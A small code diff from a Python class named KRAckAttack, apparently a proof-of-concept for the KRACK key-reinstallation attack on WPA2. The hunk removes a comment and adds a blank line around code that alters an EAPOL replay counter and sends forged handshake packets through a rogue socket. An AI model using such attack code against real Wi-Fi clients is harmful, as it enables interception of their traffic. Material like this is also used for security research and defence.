@@ -578,9 +578,9 @@ class KRAckAttack():
 				p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
 				packet_list.insert(1, p)
 
-				# FIXME: How to make scapy send packets rapidly?
 				for p in packet_list: self.sock_rogue.send(p)
 				client.msg3s = []
+
 				# TODO: Should extra stuff be done here? Forward msg4 to real AP?
 				client.attack_start()
 			else:
